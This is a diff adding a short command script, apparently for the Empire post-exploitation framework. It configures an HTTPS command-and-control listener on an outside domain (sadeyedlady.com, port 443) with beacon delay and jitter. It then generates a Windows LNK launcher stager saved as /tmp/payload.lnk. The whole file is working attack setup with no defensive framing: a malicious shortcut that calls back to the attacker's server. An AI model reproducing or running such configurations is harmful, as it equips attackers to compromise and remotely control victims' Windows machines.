@@ -1,0 +1,17 @@
+# PAYLOAD via HTTPS (sadeyedlady)
+
+listeners
+uselistener http
+set Name payload
+set DefaultDelay 12
+set Host https://sadeyedlady.com:443
+set CertPath /home/ubuntu/Empire/data
+set DefaultJitter 0.2
+set Port 443
+execute
+back
+usestager windows/launcher_lnk
+set Listener payload
+set OutFile /tmp/payload.lnk
+generate
+main
